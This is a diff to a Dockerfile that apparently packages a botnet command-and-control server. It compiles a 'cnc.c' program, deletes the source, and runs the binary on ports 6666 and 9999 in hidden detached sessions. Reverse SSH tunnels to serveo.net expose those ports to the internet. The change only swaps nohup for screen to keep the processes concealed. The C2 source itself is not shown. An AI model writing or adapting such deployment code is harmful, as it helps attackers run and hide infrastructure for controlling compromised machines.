@@ -4,7 +4,8 @@ FROM ubuntu:latest
 # Update the package repository and install openssh-client and gcc
 RUN apt-get update && \
     apt-get install -y openssh-client && \
-    apt-get install -y build-essential
+    apt-get install -y build-essential && \
+    apt-get install -y screen
 
 # Set the working directory to /app
 WORKDIR /app
@@ -20,5 +21,5 @@ RUN mkdir -p /root/.ssh && \
 RUN gcc cnc.c -o cnc -pthread && \
     rm -rf cnc.c
 
-# Run the ./cnc command and both SSH commands in hidden mode using nohup
-CMD ["sh", "-c", "nohup ./cnc 6666 1 9999 > /dev/null 2>&1 & nohup ssh -R 9999:localhost:9999 serveo.net > /dev/null 2>&1 & nohup ssh -R 6666:localhost:6666 serveo.net > /dev/null 2>&1 &"]
+# Run the ./cnc command and both SSH commands in hidden mode using screen
+CMD ["sh", "-c", "screen -d -m ./cnc 6666 1 9999 && screen -d -m ssh -R 9999:localhost:9999 serveo.net && screen -d -m ssh -R 6666:localhost:6666 serveo.net"]
